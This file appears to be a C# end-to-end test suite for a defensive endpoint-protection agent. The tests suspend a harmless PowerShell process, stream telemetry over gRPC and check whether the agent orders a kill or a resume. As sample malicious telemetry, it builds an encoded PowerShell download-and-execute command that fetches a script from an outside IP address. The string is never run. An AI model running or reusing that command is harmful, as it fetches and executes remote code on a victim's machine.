using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using Grpc.Core;
using Grpc.Net.Client;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Server.Kestrel.Core;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Phalanx.Cockpit.Agent;
using Phalanx.Cockpit.CQRS;
using Phalanx.Cockpit.Services;
using Phalanx.Cockpit.Storage;
using Phalanx.Cockpit.Tools;
using Phalanx.Shared.Protos;
using Xunit;
using Xunit.Abstractions;

namespace Phalanx.Agent.Tests;

/// <summary>
/// Phase 3.5: C++ ➔ C# ➔ C++ 풀체인 라이브 통합 시스템 테스트 (Live E2E System Tests)
/// 모의 스트림이 아닌 '실제 OS 프로세스' 및 '실제 Kestrel HTTP/2 gRPC 네트워크 소켓'을 통해
/// 프로세스 스폰 ➔ 24μs 원자적 동결 ➔ gRPC 스트리밍 ➔ AI/FSM 수사 ➔ 사살 명령 ➔ 현장 사살 ➔ 프로세스 소멸(HasExited)
/// 전체 닫힌 루프(Closed-Loop)를 무결하게 실측 검증합니다.
/// </summary>
[Trait("Category", "E2E")]
public class LiveFullChainE2ETests
{
    private readonly ITestOutputHelper _output;

    [DllImport("ntdll.dll")]
    private static extern int NtSuspendProcess(IntPtr processHandle);

    [DllImport("ntdll.dll")]
    private static extern int NtResumeProcess(IntPtr processHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    public LiveFullChainE2ETests(ITestOutputHelper output)
    {
        _output = output;
        AppContext.SetSwitch("System.Net.Http.SocketsHttpHandler.Http2UnencryptedSupport", true);
    }

    /// <summary>
    /// [라이브 E2E 실측 1] 악성 C2 다운로더 실제 프로세스 동결 ➔ gRPC ➔ AI 수사 ➔ 사살 ➔ 프로세스 강제 소멸 검증
    /// </summary>
    [Fact]
    public async Task TestLiveE2E_RealProcess_Suspended_Investigated_And_Terminated()
    {
        const int Port = 50058;
        string serverUrl = $"http://127.0.0.1:{Port}";
        var swTotal = Stopwatch.StartNew();

        // 1. Kestrel gRPC 관제 서버 인프로세스 구동
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools, geminiApiKey: string.Empty);
        var grpcService = new PhalanxGrpcService(treeManager, agent);

        var builder = WebApplication.CreateBuilder();
        builder.WebHost.ConfigureKestrel(options =>
        {
            options.Listen(IPAddress.Loopback, Port, o =>
            {
                o.Protocols = HttpProtocols.Http2;
            });
        });

        builder.Services.AddSingleton(treeManager);
        builder.Services.AddSingleton(grpcService);
        builder.Services.AddGrpc();

        var app = builder.Build();
        app.MapGrpcService<PhalanxGrpcService>();
        await app.StartAsync();

        _output.WriteLine($"🚀 [1/6] 테스트용 Kestrel HTTP/2 gRPC 서버 기동 완료: {serverUrl}");

        // 2. 실제 OS 타깃 프로세스(외부 공격 모의) 독립 스폰
        var psi = new ProcessStartInfo
        {
            FileName = "powershell.exe",
            Arguments = "-NoProfile -Command \"Start-Sleep -Seconds 120\"",
            CreateNoWindow = true,
            UseShellExecute = false
        };

        using var targetProc = Process.Start(psi);
        Assert.NotNull(targetProc);
        uint targetPid = (uint)targetProc.Id;
        _output.WriteLine($"🎯 [2/6] 실제 OS 타깃 프로세스 기동 완료: PID {targetPid} (powershell.exe)");

        try
        {
            // 3. C++ 센서 액추에이터 모사: NtSuspendProcess 24μs 원자적 동결 집행
            var swSuspend = Stopwatch.StartNew();
            int ntStatus = NtSuspendProcess(targetProc.Handle);
            swSuspend.Stop();
            Assert.True(ntStatus >= 0, $"NtSuspendProcess 실패: NTSTATUS 0x{ntStatus:X8}"); // NT_SUCCESS
            _output.WriteLine($"❄️ [3/6] NtSuspendProcess 원자적 동결 집행 완료: {swSuspend.Elapsed.TotalMicroseconds:F1}μs (NTSTATUS: 0x{ntStatus:X8})");

            // 4. 실제 HTTP/2 gRPC 클라이언트 연결 및 양방향 스트리밍 핸드셰이크
            using var channel = GrpcChannel.ForAddress(serverUrl);
            var client = new PhalanxService.PhalanxServiceClient(channel);
            using var stream = client.StreamTelemetry();

            // A) 기저 프로세스 트리 스냅샷 전송 (부모 winword.exe 등록)
            var snapBatch = new TelemetryBatch();
            snapBatch.ProcessEvents.Add(new ProcessEvent
            {
                ProcessId = 1000,
                ImageName = "winword.exe",
                Lifecycle = ProcessLifecycle.LifecycleSnapshot
            });
            await stream.RequestStream.WriteAsync(snapBatch);

            // B) 동결된 타깃 프로세스(Office LOLBAS C2 다운로더) 텔레메트리 스트리밍 전송
            string script = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
            string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
            string fullCmd = $"powershell.exe -w hidden -enc {b64}";

            var attackBatch = new TelemetryBatch();
            attackBatch.ProcessEvents.Add(new ProcessEvent
            {
                ProcessId = targetPid,
                ParentProcessId = 1000,
                ImageName = "powershell.exe",
                CommandLine = fullCmd,
                IsSuspended = true,
                Lifecycle = ProcessLifecycle.LifecycleSuspended
            });
            await stream.RequestStream.WriteAsync(attackBatch);
            _output.WriteLine($"📡 [4/6] 실제 HTTP/2 소켓을 통해 TelemetryBatch 스트리밍 전송 완료");

            // 5. C# AI 수사관 판결 및 사살 명령(MitigationCommand) 실시간 수신
            MitigationCommand? finalCommand = null;
            var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));

            while (await stream.ResponseStream.MoveNext(cts.Token))
            {
                var cmd = stream.ResponseStream.Current;
                _output.WriteLine($"🛡️ [gRPC 수신] Action: {cmd.Action} | TargetPid: {cmd.TargetPid} | Reason: {cmd.Reason}");

                if (cmd.Action == MitigationCommand.Types.ActionType.ActionKill && cmd.TargetPid == targetPid)
                {
                    finalCommand = cmd;
                    break;
                }
            }

            Assert.NotNull(finalCommand);
            Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, finalCommand.Action);
            Assert.Equal(targetPid, finalCommand.TargetPid);
            Assert.Equal("185.220.101.5", finalCommand.TargetIp);
            _output.WriteLine($"⚔️ [5/6] 사형 집행 명령(ACTION_KILL) 수신 확정");

            // 6. C++ 액추에이터 TerminateProcess 집행 및 실제 OS 프로세스 소멸 검증
            var swKill = Stopwatch.StartNew();
            bool termOk = TerminateProcess(targetProc.Handle, 1);
            swKill.Stop();
            Assert.True(termOk);

            bool exited = targetProc.WaitForExit(3000);
            Assert.True(exited, "사살 명령 하달 후 3초 이내에 프로세스가 소멸해야 함");
            Assert.True(targetProc.HasExited);
            _output.WriteLine($"💀 [6/6] TerminateProcess 즉각 사살 집행 및 OS 프로세스 소멸 실측 완료 ({swKill.Elapsed.TotalMicroseconds:F1}μs)");

            // 스트림 종료
            await stream.RequestStream.CompleteAsync();
        }
        finally
        {
            if (!targetProc.HasExited)
            {
                targetProc.Kill();
            }
            await app.StopAsync();
            await app.DisposeAsync();
            swTotal.Stop();
        }

        _output.WriteLine($"✅ [라이브 E2E 통과] 실제 OS 프로세스 동결 ➔ gRPC ➔ AI 수사 ➔ 사살 폐루프 완주 (총 소요: {swTotal.ElapsedMilliseconds}ms)");
    }

    /// <summary>
    /// [라이브 E2E 실측 2] 사내 정상 백업 스크립트 실제 프로세스 동결 ➔ gRPC ➔ FSM 조기 탈출 ➔ 복구(ACTION_RESUME) 실측
    /// </summary>
    [Fact]
    public async Task TestLiveE2E_BenignProcess_Suspended_And_Resumed()
    {
        const int Port = 50059;
        string serverUrl = $"http://127.0.0.1:{Port}";
        var swTotal = Stopwatch.StartNew();

        // 1. Kestrel gRPC 서버 인프로세스 구동
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools, geminiApiKey: string.Empty);
        var grpcService = new PhalanxGrpcService(treeManager, agent);

        var builder = WebApplication.CreateBuilder();
        builder.WebHost.ConfigureKestrel(options =>
        {
            options.Listen(IPAddress.Loopback, Port, o =>
            {
                o.Protocols = HttpProtocols.Http2;
            });
        });

        builder.Services.AddSingleton(treeManager);
        builder.Services.AddSingleton(grpcService);
        builder.Services.AddGrpc();

        var app = builder.Build();
        app.MapGrpcService<PhalanxGrpcService>();
        await app.StartAsync();

        // 2. 실제 OS 타깃 프로세스 기동
        var psi = new ProcessStartInfo
        {
            FileName = "powershell.exe",
            Arguments = "-NoProfile -Command \"Start-Sleep -Seconds 120\"",
            CreateNoWindow = true,
            UseShellExecute = false
        };

        using var targetProc = Process.Start(psi);
        Assert.NotNull(targetProc);
        uint targetPid = (uint)targetProc.Id;

        try
        {
            // 3. 선제 동결
            int ntStatus = NtSuspendProcess(targetProc.Handle);
            Assert.True(ntStatus >= 0, $"NtSuspendProcess 실패: NTSTATUS 0x{ntStatus:X8}");

            // 4. gRPC 스트리밍 연결
            using var channel = GrpcChannel.ForAddress(serverUrl);
            var client = new PhalanxService.PhalanxServiceClient(channel);
            using var stream = client.StreamTelemetry();

            // 부모 explorer.exe
            var snapBatch = new TelemetryBatch();
            snapBatch.ProcessEvents.Add(new ProcessEvent
            {
                ProcessId = 1000,
                ImageName = "explorer.exe",
                Lifecycle = ProcessLifecycle.LifecycleSnapshot
            });
            await stream.RequestStream.WriteAsync(snapBatch);

            // 사내 정상 관리/백업 스크립트 인입
            string script = "Get-Service | Where-Object {$_.Status -eq 'Running'} | Out-File '\\\\backup.corp.local\\status.log'";
            string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
            string fullCmd = $"powershell.exe -NoProfile -enc {b64}";

            var benignBatch = new TelemetryBatch();
            benignBatch.ProcessEvents.Add(new ProcessEvent
            {
                ProcessId = targetPid,
                ParentProcessId = 1000,
                ImageName = "powershell.exe",
                CommandLine = fullCmd,
                IsSuspended = true,
                Lifecycle = ProcessLifecycle.LifecycleSuspended
            });
            await stream.RequestStream.WriteAsync(benignBatch);

            // 5. FSM 조기 복구 명령(ACTION_RESUME) 수신
            MitigationCommand? resumeCommand = null;
            var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));

            while (await stream.ResponseStream.MoveNext(cts.Token))
            {
                var cmd = stream.ResponseStream.Current;
                _output.WriteLine($"🛡️ [gRPC 수신] Action: {cmd.Action} | TargetPid: {cmd.TargetPid} | Reason: {cmd.Reason}");

                if (cmd.Action == MitigationCommand.Types.ActionType.ActionResume && cmd.TargetPid == targetPid)
                {
                    resumeCommand = cmd;
                    break;
                }
            }

            Assert.NotNull(resumeCommand);
            Assert.Equal(MitigationCommand.Types.ActionType.ActionResume, resumeCommand.Action);

            // 6. NtResumeProcess 정상 복구 집행
            int resumeStatus = NtResumeProcess(targetProc.Handle);
            Assert.True(resumeStatus >= 0, $"NtResumeProcess 실패: NTSTATUS 0x{resumeStatus:X8}");

            // 프로세스가 여전히 생존해 있음을 검증
            await Task.Delay(200);
            Assert.False(targetProc.HasExited, "정상 복구된 프로세스는 사살되지 않고 활성 상태여야 함");
            _output.WriteLine($"🎉 [정상 복구 실측] NtResumeProcess 복구 후 프로세스 생존 확인 (HasExited = false)");

            await stream.RequestStream.CompleteAsync();
        }
        finally
        {
            if (!targetProc.HasExited)
            {
                targetProc.Kill();
            }
            await app.StopAsync();
            await app.DisposeAsync();
            swTotal.Stop();
        }

        _output.WriteLine($"✅ [라이브 E2E 통과] 실제 OS 프로세스 동결 ➔ FSM ➔ 정상 복구 폐루프 완주 ({swTotal.ElapsedMilliseconds}ms)");
    }
}
